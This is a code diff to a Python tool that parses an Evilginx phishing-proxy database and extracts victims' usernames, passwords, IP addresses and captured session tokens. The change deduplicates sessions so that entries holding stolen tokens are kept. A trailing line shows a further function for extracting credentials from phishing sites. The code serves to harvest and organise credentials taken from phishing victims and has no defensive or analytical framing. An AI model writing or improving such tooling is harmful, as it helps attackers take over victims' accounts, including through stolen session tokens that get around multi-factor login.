@@ -29,9 +29,9 @@ def extract_evilginx_sessions():
     """Extract sessions from Evilginx database"""
     if not os.path.exists(DB_PATH):
         return []
-    
-    all_sessions = []
-    
+
+    session_map = {}
+
     try:
         with open(DB_PATH, "r", encoding="utf-8", errors="ignore") as file:
             for line in file:
@@ -39,27 +39,32 @@ def extract_evilginx_sessions():
                     try:
                         json_part = re.search(r'\{.*\}', line).group(0)
                         session = json.loads(json_part)
-                        
+
                         # Generate a unique hash ID if the credential doesn't have one
                         if not session.get("id"):
                             unique_str = f"{session.get('username','')}-{session.get('password','')}-{session.get('ip','')}"
                             session["id"] = hashlib.md5(unique_str.encode()).hexdigest()
-                        
+
                         session["session_status"] = "extracted"
                         session["credentials_extracted"] = bool(session.get("username") or session.get("password"))
                         session["session_captured"] = bool(session.get("tokens"))
                         session["source"] = "evilginx"
                         session["source_type"] = "evilginx"
                         session["timestamp"] = datetime.now().isoformat()
-                        
-                        all_sessions.append(session)
+
+                        sid = session.get("session_id")
+                        if sid:
+                            prev = session_map.get(sid)
+                            # Replace only if new session has tokens or previous doesn't exist
+                            if not prev or (not prev.get("tokens") and session.get("tokens")):
+                                session_map[sid] = session
                     except Exception as e:
                         print(f"Error parsing Evilginx session: {e}")
                         continue
     except Exception as e:
         print(f"Error reading Evilginx database: {e}")
-    
-    return all_sessions
+
+    return list(session_map.values())
 
 def extract_site_credentials():
     """Extract credentials from phishing sites"""
